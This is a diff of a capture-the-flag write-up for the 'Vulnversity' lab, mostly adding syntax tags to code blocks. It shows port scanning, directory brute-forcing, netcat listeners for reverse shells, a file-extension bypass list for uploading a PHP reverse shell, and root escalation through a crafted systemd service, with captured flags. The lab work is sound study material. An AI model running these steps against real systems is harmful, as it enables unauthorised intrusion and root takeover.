@@ -1,12 +1,12 @@
 # Vulnversity
 
-```
+```bash
 export IP=10.10.53.246
 ```
 
 ## NMAP
 
-```
+```bash
 nmap -p- -T5 $IP
 ```
 
@@ -20,7 +20,7 @@ PORT     STATE SERVICE
 3333/tcp open  dec-notes
 ```
 
-```
+```bash
 nmap -p 21,22,139,445,3128,3333 -A -T5 $IP
 ```
 
@@ -78,7 +78,7 @@ Host script results:
 
 Testing connectivity with curl: 
 
-```
+```bash
 curl --proxy $IP:3128 google.com
 ```
 
@@ -90,13 +90,13 @@ Web server: Apache/2.4.18
 
 Saved index.html with:
 
-```
+```bash
 wget $IP:3333
 ```
 
 #### Enumeration with gobuster
 
-```
+```bash
 gobuster -w ~/wordlists/dirbuster/directory-list-1.0.txt -u http://$IP:3333/
 ```
 
@@ -124,7 +124,7 @@ Found: http://10.10.97.149:3333/internal/ (a upload page)
 
 #### Reverse shell
 
-```
+```bash
 nc -lvnp 4444
 ```
 
@@ -133,6 +133,7 @@ Upload the malicious php (reverse-shell.php)
 Failed extension not allowed
 
 Used burpsuit Intruder with a file like this:
+
 ```
 .phtml
 .php
@@ -218,7 +219,7 @@ bill:x:1000:1000:,,,:/home/bill:/bin/bash
 
 ##### User flag:
 
-```
+```bash
 $ cd /home/bill	
 $ ls -la
 total 24
@@ -232,7 +233,7 @@ $ cat user.txt
 8bd7992fbe8a6ad22a63361004cfcedb
 ```
 
-```
+```bash
 find / -type f -perm -4000
 ```
 
@@ -266,6 +267,7 @@ echo "cat /root/root.txt > /tmp/key.txt" >> /tmp/getrootflag.sh
 ```
 
 Systemctl service:
+
 ```
 echo "[Unit]
 Description=Example systemd service.
@@ -278,10 +280,12 @@ ExecStart=/bin/bash /tmp/getrootflag.sh
 WantedBy=multi-user.target" > /tmp/getrootflag.service
 ```
 
+```bash
 systemctl enable /tmp/getrootflag.service
 systemctl start getrootflag
-
 ```
+
+```bash
 www-data@vulnuniversity:/tmp$ cat key.txt
 cat key.txt
 a58ff8579f0a9270368d33a9966c7fd5
@@ -289,7 +293,7 @@ a58ff8579f0a9270368d33a9966c7fd5
 
 ##### root reverse shell
 
-```
+```bash
 nc -lvnp 7777
 ```
 
@@ -323,8 +327,9 @@ systemctl start getroot
 ```
 Listening on 0.0.0.0 7777
 Connection received on 10.10.53.246 44768
-bash: cannot set terminal process group (1715): Inappropriate ioctl for device
-bash: no job control in this shell
+```
+
+```bash
 root@vulnuniversity:/# whoami
 whoami
 root
